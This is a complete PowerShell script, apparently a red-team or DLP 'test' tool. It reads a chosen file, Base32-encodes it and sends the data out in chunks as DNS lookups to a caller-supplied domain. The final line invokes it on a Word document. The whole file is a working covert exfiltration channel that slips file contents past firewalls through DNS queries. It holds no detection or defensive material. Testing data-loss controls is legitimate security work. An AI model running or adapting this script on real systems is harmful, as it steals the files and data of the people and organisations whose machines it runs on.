function TestDns-Exfiltration {

    param(
    [string] $filePath, 
    [string] $domain, 
    [string] $dns = "8.8.8.8",
    [int16] $blocksize = 32)

    write-host "DNS File Exfiltration Test - @fgsec" -ForegroundColor "yellow"
    $block_size = $blocksize
    if(Test-Path($filePath)) {
        [byte[]] $bytes = [IO.File]::ReadAllBytes($filePath)
        $byteArrayAsBinaryString = -join $bytes.ForEach{[Convert]::ToString($_, 2).PadLeft(8, '0')}
        $Base32string = [regex]::Replace($byteArrayAsBinaryString, '.{5}', { param($Match) 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'[[Convert]::ToInt32($Match.Value, 2)] }) 
        $total_requests = [math]::truncate(($Base32string.length/$block_size))+1
        write-host "[-] File length:" $Base32string.length
        write-host "[-] Total requests to transfer this file:" $total_requests
        read-host "Press enter to start"
        $key_start = 0
        $key_end = $block_size
        $p = 0
        while($key_end -le ($Base32string.length)) {
            $payload = ($Base32string[$key_start..$key_end]) -join ""
            $url =  "$payload.$domain".ToLower();
            write-host "[!] Request to: $url" -ForegroundColor gray
            nslookup -type=A $url
            $key_start = $key_end+1
            $key_end = $key_end + $block_size
            $p++
            start-sleep -Seconds 1
        }
    } else {
        write-host "File not found!" -ForegroundColor red
    }
   write-host "[#] Done" -ForegroundColor green
}

TestDns-Exfiltration "C:\users\public\testfile.docx" "yourdomain"
